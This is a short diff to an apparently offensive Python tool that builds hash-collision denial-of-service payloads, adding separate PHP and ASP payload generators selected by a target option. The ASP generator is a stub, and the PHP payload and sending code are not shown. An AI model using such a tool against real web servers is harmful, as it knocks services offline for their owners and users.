@@ -68,7 +68,15 @@ def main():
 
     if not options.payload:
         print("Generating Payload...")
-        payload = generatePayload()
+
+        if options.target == "PHP":
+            payload = generatePHPPayload()
+        elif options.target == "ASP":
+            payload = generateASPPayload()
+        else:
+            print("Unknown target %s" % options.target)
+            sys.exit(1)
+
         print("Payload generated")
         if options.save:
             f = open(options.save, "w")
@@ -156,7 +164,10 @@ Content-Length: %s
         else:
             sock.close()
 
-def generatePayload():
+def generateASPPayload():
+    return "a=a"
+
+def generatePHPPayload():
     # Taken from:
     # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
 
